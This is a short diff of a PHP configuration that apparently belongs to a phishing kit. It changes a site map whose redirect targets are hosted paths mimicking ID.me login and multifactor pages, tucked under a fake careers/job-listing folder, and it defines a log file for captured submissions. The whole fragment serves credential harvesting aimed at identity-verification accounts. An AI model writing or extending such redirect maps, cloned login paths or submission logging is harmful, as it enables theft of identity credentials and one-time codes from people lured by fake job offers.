@@ -58,10 +58,10 @@ $site_map = [
         'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
     ],
 
-    https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/api.id.me/en/session/new.php
 
     // Add more sites...
 ];
+
 
 
 $log_file = 'submission_log.txt';
